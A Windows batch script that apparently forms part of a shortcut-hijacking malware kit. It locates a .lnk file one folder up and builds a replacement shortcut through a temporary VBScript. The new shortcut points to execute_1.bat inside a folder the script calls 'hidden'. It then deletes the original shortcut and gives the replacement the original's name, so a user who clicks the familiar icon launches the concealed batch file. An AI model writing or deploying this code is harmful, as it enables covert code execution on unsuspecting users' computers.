@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
cd ..

for %%I in (.) do set hidden=%%~nxI

cd ..
for /R "%cd%" %%F in (*.lnk) do (
    set name=%%~nxF
    set name=!name:~0,-4!
)
cd !hidden!

cd ..
echo Set oWS = WScript.CreateObject("WScript.Shell") > temp.vbs
echo sLinkFile = "%cd%\temp.lnk" >> temp.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> temp.vbs
echo oLink.TargetPath = "%cd%\!hidden!\execute_1.bat" >> temp.vbs
echo oLink.Save >> temp.vbs
cscript temp.vbs
del temp.vbs

del "!name!.lnk"
ren temp.lnk "!name!.lnk"